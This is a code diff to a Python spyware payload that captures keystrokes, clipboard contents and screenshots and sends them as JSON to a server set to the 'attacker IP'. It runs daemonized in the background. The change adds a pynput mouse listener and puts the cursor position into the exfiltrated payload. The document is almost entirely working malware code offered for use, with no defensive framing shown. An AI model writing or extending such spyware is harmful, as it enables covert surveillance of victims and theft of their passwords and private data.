@@ -30,6 +30,7 @@ from pynput import keyboard, mouse
 keystrokes = ""  # Buffer to store captured keystrokes
 clipboard_data = ""  # Buffer to store clipboard content
 previous_clipboard_data = ""  # Buffer to track the previous clipboard content
+mouse_position = "" # Buffer to store the current mouse position
 
 # Configuration settings
 server_ip = "127.0.0.1"  # Change this based on your attacker IP
@@ -90,7 +91,7 @@ def capture_screenshot():
         return ""
 
 def send_data():
-    global keystrokes, clipboard_data
+    global keystrokes, clipboard_data, mouse_position
     last_screenshot_time = time.time()
     while True:
         try:
@@ -99,12 +100,12 @@ def send_data():
             if current_time - last_screenshot_time >= screenshot_interval:
                 screenshot_base64 = capture_screenshot()
                 last_screenshot_time = current_time
-
             # Only include clipboard data if it has a value
             payload_data = {
                 "keyboardData": keystrokes,
                 "screenshot": screenshot_base64,
-                "clipboardData": clipboard_data
+                "clipboardData": clipboard_data,
+                "mousePosition": mouse_position
             }
             # Create payload in JSON format
             payload = json.dumps(payload_data)
@@ -113,6 +114,7 @@ def send_data():
             # Clear the buffer after successful send
             keystrokes = ""
             clipboard_data = ""
+            mouse_position = ""
         except requests.ConnectionError as e:
             print(f"Couldn't complete request: {e}")
         except Exception as e:
@@ -171,8 +173,15 @@ def monitor_clipboard():
             print(f"Failed to read clipboard data: {e}")
         time.sleep(1)  # Polling interval (Change if needed)
 
+def on_move(x, y):
+    global mouse_position
+    mouse_position = f"({x}, {y})" # Update global variable with mouse position
+    
 if __name__ == "__main__":
     daemonize()  # Daemonize the payload
+    # Start the mouse listener
+    mouse_listener = mouse.Listener(on_move=on_move)
+    mouse_listener.start()
     # Start the data sending thread
     data_thread = threading.Thread(target=send_data, daemon=True)
     data_thread.start()
